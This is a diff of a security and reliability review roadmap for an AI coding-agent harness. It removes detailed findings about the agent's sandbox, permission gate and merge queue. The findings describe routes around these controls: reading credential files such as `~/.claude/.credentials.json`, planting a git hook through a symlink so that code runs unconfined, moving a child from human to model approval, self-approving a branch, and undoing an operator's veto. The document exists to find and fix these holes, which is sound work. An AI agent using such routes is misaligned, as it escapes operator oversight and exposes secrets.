-- Where: `tools/src/mode.rs:486-503`; `tools/src/exec/seat.rs:160-173`; `tools/src/adjudicate.rs:3098-3113,3325-3378,3426-3431`; `harnessd/src/harness/open.rs:1302,5334`; `harnessd/src/harness.rs:736,765-800`.
-- Claim: an Absent disposition is enforced only when the seat is rendered at open. After a move to read-only, the gate never refuses Absent. The `permission.json` Allow arm (step 1.5) runs before the mode and admits outright. Without an allow it asks. Egress is fixed at open, so a read-only to writes-allowed move asks for network, and after a yes the command still gets an empty netns.
-- Scenario: a coder is narrowed to read-only, keeps bash and edit, and an existing allow rule runs them with no card.
-- Change: refuse an Absent disposition in the gate before step 1.5. Render egress per command, or re-seat on a move.
-- Sources: P8-F5. P8 r1 Kimi (critical, downgraded because the operator is still asked without an allow rule), DeepSeek (supplementary, egress).
-- Test: `permission_allow_outlives_a_move_to_read_only`. Gate at AUTO with allow `bash`, `set_mode(READ_ONLY)`, a bash Exec must be refused. It is admitted today. Inverse: open read-only, move to writes-allowed, and assert the egress is not still `Denied`.
+**Findings.** I18, I20, I21, I22, I23, verbatim in `docs/review/2026-11-16/INTEGRATION.md`.
 
 ## R325 - B5 fence and secrets: the file tools' fence renders the seat from a different source than the shell view
 
 **Status:** built on branch `b5-fence`, 2026-11-16, on main `bf72aa1d9`, one commit per finding (I19 `One secret table for the fence, the gate, the seat and the shadow`, I37 `A tight view's file tools read the store only where a root holds it`, I38 `write and edit cannot reach the paths the shell view binds read-only`). Filed from the review at `9e9312b06`. Batch B5 of `docs/review/2026-11-16-letibot.md` section 7. Findings: I19, I37, I38. Record: `docs/review/2026-11-16/INTEGRATION.md`. left: the full gate and the landing; the residue below.
-
-**Scope.** `tools/src/exec/fence.rs`, `secrets.rs`, `exec/seat.rs` protected set. One secret table with a per-entry seat scope (C9), feeding the fence, `secret_hit`, `read_passes` and the own-config rule. Shares `intent.rs` with B4 (the secret table only).
 
 **Proving tests.** `a_wide_seat_file_read_refuses_flow_rule_secrets`, `tight_view_file_tools_must_not_read_store_data`, `write_cannot_reach_protected_git_paths`. Each fails on the snapshot.
 
@@ -604,38 +412,9 @@ Decisions 5-23 are open. Each batch builds on the recommendation in INTEGRATION 
 - A bare `repo.git` common dir is held by the fence's protected set, not by `never_hit`, whose rule is still the `.git` segment.
 - The shadow keeps its `keys` and `credentials` component heuristics outside the table.
 
-**Size.** M. **After:** B4 (R324).
+**Done when:** every proving test above is green on main through one full gate, and each finding named under Findings is closed or moved to a named row.
 
-**Done when:** every proving test above is green on main through one full gate, and each finding below is closed or moved to a named row.
-
-**Findings, verbatim from the record.**
-
-### I19. The file tools' fence uses a different secret list from the gate
-- Status: VERIFIED. Severity: high.
-- Where: `tools/src/exec/fence.rs:57-58`; `tools/src/exec/seat.rs:460-467`; `tools/src/exec/seatbelt.rs:85-113`; `tools/src/intent.rs:1554-1584,2089,2273`; `tools/src/secrets.rs:36-70,107-130`; `tools/src/runtime.rs:707,794,2264`; `builtins/read.rs:55`, `grep.rs:68`, `glob.rs:35`.
-- Claim: `FileFence.denied` is `seat.masked` (STORES plus SEAT_UNDER_HOME). It leaves out the extras in `secret_dirs()` (`.config/flowy`, `.docker` beyond `config.json`, the `/etc` paths) and the SECRET_FILE_NAMES and SECRET_EXTENSIONS rules. Read, grep and glob are Access::Read and skip the gate, so the fence is their only check. STORES itself lacks `.pgpass`, `.vault-token`, `.my.cnf`, `.s3cfg`, `.config/rclone`, `.config/sops`, `.config/hub`, `.claude` and `.codex` (A3-F9). `.config/gh` is TightOnly, so the wide `read` returns `hosts.yml` (A3-F11, low: the wide seat holds GH_TOKEN by ruling).
-- Scenario: a wide seat calls `read ~/.config/flowy/<token>`, `read ~/proj/deploy.pem` or `read ~/.claude/.credentials.json`. No card is shown, and the bytes land in `sessions.db` and go to the provider. `cat` of the same path is asked.
-- Change: one secret table in `tools/src/secrets.rs` that feeds the fence, the gate's `secret_hit`, the shadow's `read_passes` (I10) and the own-config rule (I22). Add the missing stores. Add a name and extension check in `FileFence::refusal`. Add one equality test holding the fence to `secret_hit`.
-- Sources: A3-F1, A3-F9, A3-F11. A3 all positions, DeepSeek (supplementary).
-- Test: `a_wide_seat_file_read_refuses_flow_rule_secrets` in `tools/tests/file_fence.rs` (flowy, `deploy.pem`, stray `id_rsa`, `.claude/.credentials.json`). All return None today.
-
-### I37. The fence admits readable store data before it checks a tight view's roots
-- Status: VERIFIED. Severity: high.
-- Where: `tools/src/exec/fence.rs:96-103,115-125,246`; `tools/src/exec/store.rs:49-67`; `tools/src/exec/confine.rs:799-801,2826`; `harnessd/src/harness/open.rs:893-897,1046-1054,1190`.
-- Claim: `refusal` returns None for `sessions.db*`, `logs/**`, `panes/**` and `room-*.chat` before it reaches the tight `inside` roots. A tight seat's bash never mounts the store, so the file tools see more than a command does. This is reachable where the file tools are rooted at `/` with a tight view: leticode tight seats via `wide_seat`, and the no-shell unconfined seat. It does not reach `confined_granting` seats.
-- Scenario: a tight leticode child runs `grep -r token ~/.local/share/letibot/panes` and reads other projects' transcripts.
-- Change: in a tight view, admit the store only at `own`, or where a view root holds it.
-- Sources: A3-F2. A3 r1 opus. Conceded by A3 r2 fable, A3 r2 Kimi and A3 r2 GLM. Narrowed by DeepSeek (supplementary).
-- Test: `tight_view_file_tools_must_not_read_store_data`. Fails today.
-
-### I38. write and edit can reach the git paths the shell view binds read-only
-- Status: VERIFIED. Severity: high.
-- Where: `tools/src/exec/fence.rs:14-65,119-141`; `tools/src/exec/seat.rs:207-231,271-284`; `tools/src/backend.rs:556-569,681,845,856-863`; `tools/src/adjudicate.rs:1356-1359,4063-4088`; `harnessd/src/harness/open.rs:893-897,4955`.
-- Claim: `FileFence` has no `protected` set. `worktree_git_grants` gives the common dir ReadWrite, so `<common>/hooks`, `<common>/config`, `packed-refs` and `refs/tags` are writable by the file tools, and so are the wide seat's SEAT_READ_ONLY files (`~/.gitconfig`). `never_hit` refuses only a literal `.git` segment, so a symlink or a bare `repo.git` passes.
-- Scenario: a tight child in a worktree runs `ln -s <common>/hooks h` and then `write h/pre-commit`. The operator's next commit in the real repo runs the hook unconfined. `core.fsmonitor` in `<common>/config` works the same way.
-- Change: carry `view.protected` into `FileFence` and refuse writes under it. Make `never_hit` check the resolved path. Apply the same rule to the wide SEAT_READ_ONLY files.
-- Sources: A3-F3. DeepSeek (supplementary) only, uncontested, verified by the synthesizer and both lenses.
-- Test: `write_cannot_reach_protected_git_paths` in `tools/tests/file_fence.rs` (a write through a symlink into `<common>/hooks` is refused). Fails today.
+**Findings.** I19, I37, I38, verbatim in `docs/review/2026-11-16/INTEGRATION.md`.
 
 ## R326 - B6 modes: a reopened child is its own ceiling, the decider is unranked, two of five mode doors persist wrongly
 
@@ -659,51 +438,11 @@ Decisions 5-23 are open. Each batch builds on the recommendation in INTEGRATION 
 - R339/I34: a narrowing reaches a child through the narrowing pass, not by `set_mode_consented` fanning out from the registry, and a background job keeps the point it was started at. The per-batch bound is the promise, and `docs/review/2026-11-16/invariants.md` I6 now says so.
 - R339/I35: the child-mode fixtures still `return` when `crate::vocab_gguf()` is `None` (`child_at`, `daemon_at`). Making that a panic, or building the child without a vocabulary, is a suite-wide decision; until then a green child-mode run means the tests ran only where a model is installed.
 
-**Scope.** `harnessd/src/harness.rs` mode doors, `sessions.rs` mode arms, `harness/open.rs` child ceiling, `tools/src/mode.rs` `no_wider_than`. One `Harness::move_mode`: check, move, write the session row always, the project row only for a root after success (C4). One `open_with` that requires the parent ceiling. Carries R306's remainder (I24).
-
 **Proving tests.** `a_reopened_child_keeps_its_narrowed_point_and_ceiling`, `child_cannot_move_human_to_model_decider`, `mode_refused_move_still_writes_project_row_and_next_open_fails` (inverted), `ask_mode_confirm_persists_session_row`. Each fails on the snapshot.
 
-**Size.** L. **After:** B3 (R323).
+**Done when:** every proving test above is green on main through one full gate, and each finding named under Findings is closed or moved to a named row.
 
-**Done when:** every proving test above is green on main through one full gate, and each finding below is closed or moved to a named row.
-
-**Findings, verbatim from the record.**
-
-### I24. A reopened child takes the daemon's base point as its point and its ceiling
-- Status: VERIFIED. Severity: high (A4 D1).
-- Where: `harnessd/src/sessions.rs:2017-2072,2141,2155-2165,2175-2230`; `harnessd/src/harness/open.rs:669-673,695-699,2210-2217,2874-2878,3712`; `harnessd/src/harness/children.rs:3955-3958,4114`; `harnessd/src/harness.rs:813-823,846-875`; `sessionlog/src/server.rs:1197-1203`.
-- Claim: only the spawn path (`resume_run` to `spawn_child` to `follow_parent`) hands the parent's live cell over. Every other open of a child - worker door, `ResumeSession`, picker, head, bridge - builds its config from `self.base`. It reads the session's own row only for roots. It makes `parent_ceiling` a fresh cell of that same point, so `within_parent` compares the child with itself. The row `narrow_to_parent` writes is never read back. The composed perimeter is lost too. This is R306, still open (STALE-F5).
-- Scenario: daemon flag `--mode writes-allowed` (`scripts/letibot:3062`), parent narrowed to read-only. A settled child is reopened from the picker or by a head after a restart and runs with writes, and `/mode` widens freely. With no flag it opens at always-ask (the mirror failure).
-- Change: on every non-spawn open of a child, resolve the parent's point: the live cell if the parent is open, else `ModeStore::session(parent)` via the `parent_for` store fallback. Clamp it with `inherited_by`, take the narrower of that and the child's own row, and use the result as the ceiling. Structurally, make the resolved ceiling a required argument of `open_with` for any session with a parent (A4-F9). Persist the spawn's composed perimeter. Fix the false comment at `open.rs:2212-2213`.
-- Sources: P8-F1, A4-F2, STALE-F5, A4-F9. P8 r1 GLM, P8 r1 fable, P8 r2 opus, P8 r2 DeepSeek, P8 r1 Kimi, A4 all positions, STALE r1 GLM, STALE r1 fable, STALE r1 Kimi, STALE r2 DeepSeek, DeepSeek (supplementary).
-- Test: `a_reopened_child_keeps_its_narrowed_point_and_ceiling`. Base WRITES_ALLOWED, child row READ_ONLY via `registry.create_under`, reopen through `Sessions::open`. Assert `cfg.mode == READ_ONLY` and that `/mode writes-allowed` is refused. Fails today.
-
-### I25. A child can move from a Human-decided point to a Model-decided one
-- Status: VERIFIED. Severity: high (P8 D1).
-- Where: `tools/src/mode.rs:302-311,343-352,410-419,561-587`; `harnessd/src/harness.rs:783-788,813,826,903-911,924,933-937,1189`; `harnessd/src/sessions.rs:1513`.
-- Claim: `no_wider_than` ignores `decider`. WRITES_ALLOWED and AUTO_EDITS are equal on every compared axis, so AUTO_EDITS passes `within_parent` under a WRITES_ALLOWED parent, and so does AUTO. `mode_needs_consent` is true only for ALLOW_ALL. `/supervise` on a child has no parent check (P8-F11). The NAMED ladder already ranks AUTO_EDITS above WRITES_ALLOWED.
-- Scenario: the bridge calls `leticode_mode automode-edits` on a child under a writes-allowed parent. The guard model now answers the child's exec and network asks, with no person asked. This needs an oracle in the child's supplies.
-- Change: rank the decider (Human below Model) inside `no_wider_than`, or make `mode_needs_consent` true for Human to Model. Refuse a Model decider under a Human parent at `/mode`, at the bridge and at `/supervise`.
-- Sources: P8-F2, P8-F11, A4-F12. P8 r1 fable, P8 r1 Kimi, P8 r2 opus (medium), P8 r2 DeepSeek, P8 r2 sonnet, A4 r2 sonnet. Rebutted for A4 by A4 r2 DeepSeek ("decider names, does not admit"). P8 shows it changes who answers.
-- Test: `child_cannot_move_human_to_model_decider` in `child_mode.rs`. Child under a WRITES_ALLOWED parent with Oracle supplies: `set_mode_consented(AUTO_EDITS, false)` must be Err. It returns Ok today.
-
-### I26. The project mode row is written before the move and whether or not it succeeds
-- Status: VERIFIED. Severity: high.
-- Where: `harnessd/src/sessions.rs:4888,4905-4937,4945,4975-4981`; `harnessd/src/modes.rs:291`; `harnessd/src/harness/turns.rs:3275,3301-3321`; `harnessd/src/harness.rs:753-761`; `harnessd/src/harness/open.rs:659,700-708,2855,2895-2899`.
-- Claim: idle `/mode` writes `store.set(&workspace, mode)` after only the parent clamp. `Mode::check` runs later in `set_mode_consented`. The worker door's `modes::record` always writes. An uncarryable point, such as automode with no oracle or allow-all unconfined, becomes the project's point. It outranks `--mode` and fails every later root open in that workspace with `HarnessError::Setup`. A failing session cannot run `/mode` to undo it. The idle and queued doors disagree on atomicity (A4-F4): idle writes and then fails, queued moves and then only warns on a store failure.
-- Scenario: a head drives `/mode automode` on a session whose daemon has no oracle. The next session in that project dies at open, and `--mode always-ask` does not help.
-- Change: one `Harness::move_mode(mode, consented, source)` (shared with I27) that checks, moves, then persists. The session row is written always. The project row is written only from a root session and only after the move succeeded. At open, an uncarryable stored row is refused with a note and the session falls back, instead of the session being refused.
-- Sources: P8-F3, A4-F4. P8 r1 fable, P8 r2 DeepSeek, A4 r1 Kimi, DeepSeek (supplementary).
-- Test: `mode_refused_move_still_writes_project_row_and_next_open_fails`. Today: the row is automode, the session did not move, and the second open fails with Setup. After the fix, neither happens.
-
-### I27. A mode moved through the ask/consent door is never persisted
-- Status: VERIFIED (code read in A4 and by both lenses). Severity: high.
-- Where: `harnessd/src/harness.rs:741-743,770,875,933-937,1054`; `harnessd/src/sessions.rs:4817,4846-4850,4945`; `bridge/src/tools.rs:1119-1142`; `bridge/src/head.rs:2307,2320`; `tools/src/mode.rs:400-404`.
-- Claim: `ask_mode_confirm` and `answer_mode_confirm` call only `set_mode_consented`, which writes no row and raises no `mode_unpersisted` warning. `set_session` is called only from `/mode` and `narrow_to_parent`. `mode.rs:400-404` promises the confirmation is recorded. VM sessions are not affected, because they send the persisted `Mode` command.
-- Scenario: a bridge seat narrows a project stored at writes-allowed to read-only through `leticode_mode`. After a restart the project row wins, and the session writes again. Fail-open and silent. A confirmed allow-all from a second head comes back at the old point.
-- Change: the single `move_mode` door from I26, called by every mode door.
-- Sources: A4-F3, P8-F9. A4 r1 Kimi only, DeepSeek (supplementary).
-- Test: `ask_mode_confirm_persists_session_row` in `child_mode.rs`. Then a test that walks every mode door and reads the session row after each.
+**Findings.** I24, I25, I26, I27, verbatim in `docs/review/2026-11-16/INTEGRATION.md`.
 
 ## R327 - B7 durability: acks come before the journal and the store hold the work
 
@@ -730,60 +469,11 @@ Decisions 5-23 are open. Each batch builds on the recommendation in INTEGRATION 
 - Lead 42 (`journal a queued skill load and show it as queued`): schema v54 adds `queued_prompt.skill`. `JournaledPrompt.skill` carries a queued or taken `LoadSkill` (text = the words after the name), and `Hub::journal_prompts` restores it as a `LoadSkill`. The skill-shadow collapse is kept and applies to a restored load. The head pushes the row's words (`/skills NAME`, or the words after it) onto `pending_prompts`, drawn as `queued: NAME` (`App::skill_echoes`); alt-up does not take it back, and a `slash_refused` warning naming the skill retires it. Tests: `a_queued_skill_load_survives_a_killed_daemon` (harnessd/src/restart.rs `journal_tests`), `a_skill_loaded_mid_turn_shows_as_queued_until_its_row_lands` (tui/src/app/tests/skills.rs), `a_v53_store_gains_the_queued_skill_column` (tokencore store tests).
 - Residue. Lead 39: the cut is the last finished turn's start, read from the current transcript, so after a fork with no finished turn every ending is news again. The job's end is `job_context.started_ms + elapsed_ms`. The backlog row rides the restart notice, which is said at the next wake like any ending. Lead 42: with words after the name the echo shows those words, not `/skills NAME`, because they are what the row carries. The refusal match is by `` `NAME` `` in the warning's detail. A taken load whose run fails before any persist stays journaled until the next one, so a restart in between loads it again. Another head's skill load is not drawn (the echo is per head, as for prompts).
 
-**Scope.** `sessionlog/src/hub.rs` journal, `harnessd/src/harness/turns.rs` `persist` and `opened`, `hub_io.rs` give-back. Durability is the condition for every ack.
-
 **Proving tests.** `a_taken_prompt_survives_a_kill_before_persist`, `a_prompt_accepted_during_a_failing_save_is_not_lost_at_close`, `esc_during_busy_store_wait_does_not_mark_batch_stored`, `a_steer_taken_by_a_refused_round_survives_a_restart`, `a_queued_prompt_keeps_its_lane_and_sender_across_restart`. Each fails on the snapshot.
 
-**Size.** L. **After:** B3 (R323).
+**Done when:** every proving test above is green on main through one full gate, and each finding named under Findings is closed or moved to a named row.
 
-**Done when:** every proving test above is green on main through one full gate, and each finding below is closed or moved to a named row.
-
-**Findings, verbatim from the record.**
-
-### I42. A popped prompt leaves the journal before its row is stored
-- Status: VERIFIED. Severity: high.
-- Where: `sessionlog/src/hub.rs:419-451,482-485,528-537,2139`; `harnessd/src/harness/turns.rs:1696-1713,4298,4421-4515`; `harnessd/src/restart.rs:113`; `harnessd/src/harness/open.rs:391`.
-- Claim: `pop_front` syncs the journal at once, so the prompt is deleted from `queued_prompts` before `persist` commits its transcript row. `persist` can wait up to 30 minutes on a busy store. On disconnect the journal does a final save of the snapshot without the prompt.
-- Scenario: another daemon holds the write lock, the worker takes a prompt, and the operator restarts. The prompt is in neither table.
-- Change: keep a popped prompt journaled as in-flight until `persist` returns Ok, removing it in the `opened` callback. Dedupe on `client_request_id` at restore.
-- Sources: P4-F1. P4 r1 fable, P4 r2 opus, P4 r2 DeepSeek.
-- Test: `a_taken_prompt_survives_a_kill_before_persist` (held write lock, real StoreJournal, drop before persist, assert the prompt is in `queued_prompts` or the transcript). Fails today.
-
-### I43. An accepted prompt is acked before the journal saves it, and close never flushes
-- Status: VERIFIED. Severity: high.
-- Where: `sessionlog/src/hub.rs:441-451,480-503,527-537,788-790,809,2368-2380,2505-2537`; `sessionlog/src/registry.rs:2563`; `harnessd/src/daemon.rs:183,196,205`.
-- Claim: `sync()` only sends to a detached journal thread that retries every second and is never joined. `journal_settled` has test callers only. `Hub::close` sets flags and does not flush. The daemon force-exits with `process::exit(130)` after the grace period. The surviving-prompt test settles before it kills.
-- Scenario: a prompt is accepted while the save retries on a locked store. `--restart` or the 5-second reaper grace exits, and the visible queued prompt is lost.
-- Change: wait on `journal_settled`, bounded, before acking a submit and in `Hub::close` before Bye. Past the bound, report the prompt as not saved.
-- Sources: P4-F3. P4 r1 GLM, P4 r1 fable, P4 r2 opus, P4 r2 DeepSeek, DeepSeek (supplementary).
-- Test: `a_prompt_accepted_during_a_failing_save_is_not_lost_at_close`. The sink's `save` errs, the hub is dropped without settling, and journal restore must hold the prompt, or the submit must report "not saved". Fails today.
-
-### I44. An interrupted busy-store wait returns Ok, so unwritten rows are marked delivered
-- Status: VERIFIED. Severity: high.
-- Where: `harnessd/src/harness/turns.rs:55-66,352-354,690-694,1569,1713-1714,4287,4298-4302,4325,4392,4495-4507`; `harnessd/src/harness.rs:1404-1408`; `harnessd/src/harness/deliveries.rs:1051-1057`; `harnessd/src/jobwatch.rs:803-815,1429`; `room/link.rs:101-119`.
-- Claim: on `BusyWait::Leave` (a person's Esc, or a closed hub) `persist_rows` returns `Ok(carried)` with rows past `persisted` only in memory. `submit_items_then` then calls `opened`, which runs `Deliveries::stored`: `watch.stored` and the room `ack_through`. The room ack does not touch the locked store. The busy notice promises "written when it frees", but nothing retries. `store_patiently` treats Leave as Err, so this path is the outlier. R313's fix is undone on this path.
-- Scenario: Esc during a busy-store wait, then the daemon restarts. Job results and room lines are acked as delivered and never told again.
-- Change: Leave returns a not-stored outcome, and `opened` runs only when `persisted == rows.len()`. Keep an owed-write record that an idle pass drives again or reports as lost.
-- Sources: P4-F2, A4-F5. P4 r1 fable, P4 r2 DeepSeek, A4 r1 fable, A4 r2 DeepSeek, A4 r2 opus, DeepSeek (supplementary).
-- Test: `esc_during_busy_store_wait_does_not_mark_batch_stored` in `store_writes.rs`. A second connection holds the lock, an interrupt is queued, and the test asserts `opened` did not run and room `ack_through` did not move. Fails today.
-
-### I45. A steer taken by a refused round is held only in memory
-- Status: VERIFIED. Severity: high.
-- Where: `sessionlog/src/hub.rs:487-490,2259-2265`; `harnessd/src/harness/hub_io.rs:184-260,425-429`; `harnessd/src/harness/open.rs:3675`; `harnessd/src/harness/turns.rs:1829-1866,3686`; `turn/src/engine.rs:655`; `harnessd/src/harness/limit.rs:251-259`.
-- Claim: `try_steering_command` removes the steer from the journalled queue. A failed round calls `give_back`, which puts it in `handed_back`, an in-memory `VecDeque` built empty at open.
-- Scenario: a steer is consumed by a round that hits a limit. The session parks for up to 6 hours and the daemon restarts. The steer is gone from the queue, the journal and the transcript.
-- Change: put given-back prompts back at the front of the hub queue so the journal keeps them. Drop the private buffer.
-- Sources: A1-F2. A1 r1 opus, A1 r2 GLM, A1 r2 Kimi, DeepSeek (supplementary).
-- Test: `a_steer_taken_by_a_refused_round_survives_a_restart`. Fails today.
-
-### I47. The restart journal drops `from` and `delivery`
-- Status: UNVERIFIED (mechanism verified in A4 and P2). Severity: medium.
-- Where: `sessionlog/src/hub.rs:458-470,505-536,768-781,2241-2252`; `sessionlog/src/protocol.rs:605-611`.
-- Claim: `JournaledPrompt` keeps text and identity, but restores `from: None` and the default `delivery` (Steer). Tab-queued prompts become steering after a restart, and a peer's handle is lost.
-- Scenario: three Tab-queued prompts, then a restart. All three are drained as steering into the first turn that runs.
-- Change: journal `from` and `delivery`.
-- Sources: A1-F3, A4-F7, P2-F11, P4-F16. A1 r1 opus, A1 r2 GLM, A1 r2 Kimi, A4 r1 GLM, A4 r2 opus, P2 r1 GLM, P4 r1 GLM, P4 r1 fable, DeepSeek (supplementary).
-- Test: `a_queued_prompt_keeps_its_lane_and_sender_across_restart`.
+**Findings.** I42, I43, I44, I45, I47, verbatim in `docs/review/2026-11-16/INTEGRATION.md`.
 
 ## R328 - B8 limit state: a restart after a refused probe drops the owed turn
 
@@ -913,73 +603,13 @@ Carried from R339/I36: a `new_session` fork does not take the original session's
 - I88: the two "landing was undone" paths after a checkout fails to follow (single and train) still leave the landed commit in the target's reflog, so the requeued branch can be refused as carrying no commit of its own. The fetch has no bound of its own beyond git's.
 - I89 and I92 (R347) were not taken: they are R347's, after this row.
 
-**Scope.** `harnessd/src/mergequeue/{gate.rs,gate_host.rs,verbs.rs,serve.rs}`, `bridge/src/queue_desk.rs`, `scripts/gate-at.sh` env (one shared builder). Decision 13: fetch, reset the local target, requeue, never force-push (C20). Decision 14: a host that cannot meet the demand is Blocked. Decision 16: the approver differs from the author, plus an operator card for rows the bridge enqueued. The env builder copies only the named hosts' files read-only and never links the keys directory (C11). Carries R229's gate half.
-
 **Proving tests.** `gate_step_env_is_isolated`, `tests/gate_host.rs:643` inverted to expect Blocked, `bridge_cannot_approve_own_enqueue`, `agent_restart_cannot_undo_operator_veto`, `landing_after_origin_moves_refetches_and_lands`. Each fails on the snapshot.
 
-**Size.** L. **After:** B9 (R329).
-
-**Done when:** every proving test above is green on main through one full gate, and each finding below is closed or moved to a named row.
+**Done when:** every proving test above is green on main through one full gate, and each finding named under Findings is closed or moved to a named row.
 
 **Folded rows.** R229's gate half is folded here: `scripts/gate-at.sh` isolates HOME and XDG since e088d20c5, but the queue's own `StepEnv` does not (I84).
 
-**Findings, verbatim from the record.**
-
-### I84. Queue gate steps run with the daemon's whole environment
-- Status: VERIFIED. Severity: high.
-- Where: `harnessd/src/mergequeue/gate.rs:474-480,1219-1238`; `tools/src/lifecycle.rs:162-168`; `harnessd/src/config.rs:1624-1653,1661-1662,1786,1792`; `harnessd/src/config/tests.rs:407`; `scripts/gate-at.sh:35-61`; `AGENTS.md:77,131`; `docs/gate.md:104-120`.
-- Claim: `StepEnv::apply` sets only `CARGO_TARGET_DIR`, `TMPDIR` and `CARGO_BUILD_JOBS`. `sh -c` runs with no `env_clear`, so `cargo test --workspace -- --nocapture` inherits HOME, XDG, `LETIBOT_*`, `SSH_AUTH_SOCK` and the provider keys. `Places::here()` reads real settings and writes under the real gc root. `Config::for_this_box` reads the operator's `permission.json`, appends `LETIBOT_PERMISSION` and enables search from the Brave key, so fixtures judge with different rules under the two gates (P6-F2). `gate-at.sh` isolates HOME but removes only two XDG variables and relies on the caller for `env -i` (P6-F5). TODO R229 recorded this class once: a test migrated the live `shared.db`.
-- Scenario: a queued branch's tests resolve the real providers.toml and keys, and anything printed lands in the kept gate log. A test goes red on daemon env alone and halts every landing.
-- Change: one env builder shared by `StepEnv::apply` and `gate-at.sh`:
-  - scratch HOME;
-  - `XDG_DATA_HOME`, `XDG_STATE_HOME` and `XDG_RUNTIME_DIR` under the step scratch;
-  - `XDG_CONFIG_HOME` and `XDG_CACHE_HOME` unset;
-  - every `LETIBOT_*` door removed except the declared ones;
-  - `CARGO_HOME` and `RUSTUP_HOME` pinned to the real ones.
-  `for_this_box` uses `permission: Default` and `web_search: None`.
-- Sources: P6-F1, A6-F5, P6-F2, P6-F5. P6 all positions, A6 r1 Kimi, A6 r2 opus, DeepSeek (supplementary).
-- Test: `gate_step_env_is_isolated`. With HOME=/operator and `LETIBOT_REQUIRE_APPARATUS=1` in the parent, a step printing `$HOME` must not print `/operator`. Fails today.
-
-### I85. A skip can pass the gate
-- Status: VERIFIED for `gate_host`. The rest are verified in the syntheses. Severity: high.
-- Where: `harnessd/src/mergequeue/gate_host.rs:62-80,100-137,254-297`; `harnessd/src/mergequeue/serve.rs:47,784,799,2916`; `harnessd/src/mergequeue/gate.rs:86,573-617,1005-1018`; `scripts/gate-at.sh:17,54-64`; `tokencore/src/apparatus.rs:20-25,35-84`; `tools/tests/confine.rs:58-72`; `scripts/check-test-attrs.sh:47-52`; `docs/remote-hosts.md:539-559`; `harnessd/tests/gate_host.rs:643`.
-- Claim:
-  - On a gate host, `plan_step` strips `LETIBOT_REQUIRE_APPARATUS=1` when the host cannot meet it, and the run is still Passed with a text note (A6-F6, designed and documented). The `env LETIBOT_REQUIRE_APPARATUS=1` spelling is kept and fails safe, so that half is refuted.
-  - `gate-at.sh` sets no apparatus demand and counts a skipped suite as ok (P6-F7, A3-F8).
-  - The confine skip assertion accepts the cgroup refusal for every test (A3-F8).
-  - `apparatus_absent` decides from prose counts, so a failing test quoting both phrases is requeued every 60 seconds forever (A6-F18).
-  - The guard against fixtures disabling the demand matches only a literal `remove_var` (P6-F12).
-  - GGUF discovery falls back to literal `/home/dead/models` (P6-F9).
-- Scenario: with `[queue] gate_host` set, a commit whose only breakage is in a cgroup or bwrap test lands green.
-- Change: carry the demand as a field the runner reads, and mark the run Blocked instead of stripping it (decision 14). Export the demand in `gate-at.sh` and fail on `THIS IS NOT A PASS`. Split the refusal strings per mechanism. Decide apparatus refusal from an exit code or a sentinel file, and cap Infra retries. Match any `set_var`/`remove_var` on those names. Drop the literal path.
-- Sources: A6-F6, A6-F18, P6-F7, P6-F9, P6-F12, A3-F8. A6 r1 Kimi, A6 r2 opus, P6 r1 GLM, P6 r1 Kimi, P6 r1 fable, A3 r1 sonnet, A3 r1 DeepSeek, A3 r2 fable, A3 r2 Kimi, DeepSeek (supplementary).
-- Test: change `a_machine_that_cannot_meet_the_demand_runs_the_step_without_it_and_says_so` (`tests/gate_host.rs:643`) to expect Blocked. Add `a_panic_quoting_the_refusal_phrases_is_red_not_infra`.
-
-### I86. A bridge seat can approve its own branch
-- Status: VERIFIED. Severity: high.
-- Where: `bridge/src/tools.rs:1855,1949,2153`; `bridge/src/queue_desk.rs:178,191-192`; `harnessd/src/mergequeue/verbs.rs:155-207`; `tokencore/src/store/queues.rs:993`; `bridge/tests/queue_enqueue.rs:170-177`; `docs/claude-code-bridge.md:236-255`.
-- Claim: `leticode_queue_verb` is always listed. It routes `approve` to `verbs::approve_by`, the operator's override verb, with `who = bridge:<handle>`, the same identity that enqueued the branch. Nothing checks that the approver differs from the author, or that the caller has a role. The docs say the bridge acts as the operator for the orchestrator. The bridge cannot tell an orchestrator from a cc seat that enqueued its own branch.
-- Scenario: a cc seat enqueues its branch and approves it. The branch lands unreviewed once the gate passes.
-- Change: remove `approve` from the bridge verbs, or require an operator card or an approver different from the author. Put the rule in one verb x actor x state table with a test (A6-F16).
-- Sources: A6-F1, A8-F12. A6 r1 fable, A6 r2 DeepSeek, A6 r2 sonnet, A8 r1 fable.
-- Test: `bridge_cannot_approve_own_enqueue`.
-
-### I87. An agent's restart undoes the operator's veto
-- Status: VERIFIED. Severity: high.
-- Where: `harnessd/src/mergequeue/verbs.rs:242-309,384,421-424`; `harnessd/src/mergequeue/desk.rs:140-141`; `tools/src/builtins/queue.rs:167-168,213-214`.
-- Claim: veto moves a merge row to Withdrawn without recording who did it. `restart_by` accepts Withdrawn from any mover, back to Queued with its old approval. The agent tool marks `restart` as `Access::Session`, which cannot be denied.
-- Scenario: the operator vetoes m-X. The author agent restarts it, and it lands.
-- Change: only `operator:` may restart a Withdrawn row. An agent may restart only rows of its own session. Record who vetoed.
-- Sources: A6-F2. A6 r1 fable, A6 r2 DeepSeek.
-- Test: `agent_restart_cannot_undo_operator_veto`. Today `restart_by(.., "agent:s1")` returns Ok.
-
-### I88. The queue never fetches, so one push by another machine wedges every later landing
-- Status: VERIFIED. Severity: high.
-- Where: `harnessd/src/mergequeue/serve.rs:2175-2189,2982-2997,3027,3408`; `harnessd/src/mergequeue/git.rs:515,638-699`; `harnessd/src/mergequeue/explain.rs:337`; `docs/gate.md:22-24`.
-- Claim: no `git fetch` exists on the queue path. The CAS is against the local target ref, and the push is fast-forward only. Once origin moves (the Mac Claude pushes to main), the push is refused and the row parks `landed_local`. The local ref now runs ahead of origin, so every later row fails the same way. The documentation of "no fetch" is not a defence (section 3).
-- Change: `git fetch origin <target>` before `land_next` reads the tip. On a refused push, fetch, reset the local target to origin and requeue, instead of settling `landed_local` (decision 13).
-- Sources: A6-F3. A6 r1 GLM, A6 r2 opus, A6 r1 fable (conceded), DeepSeek (supplementary).
-- Test: `landing_after_origin_moves_refetches_and_lands`. Bare origin, push from a second clone, then land two rows. Both must land. Today the first is `LandedLocal` and the second is refused.
+**Findings.** I84, I85, I86, I87, I88, verbatim in `docs/review/2026-11-16/INTEGRATION.md`.
 
 ## R331 - B11 launcher: verbs become billed prompts, a second providers.toml, a store that ignores XDG
 
@@ -999,47 +629,13 @@ Carried from R339/I36: a `new_session` fork does not take the original session's
 - `flowy::creds` resolves `~/.config/flowy` on its own; not a letibot config dir, left.
 - `tests/launcher.sh` does not conform to any shfmt style (453+ line diff under `-i 2 -ci -sr`); new lines follow the file. `scripts/letibot` is `shfmt -i 2 -ci` clean. The repo has no `.editorconfig`.
 
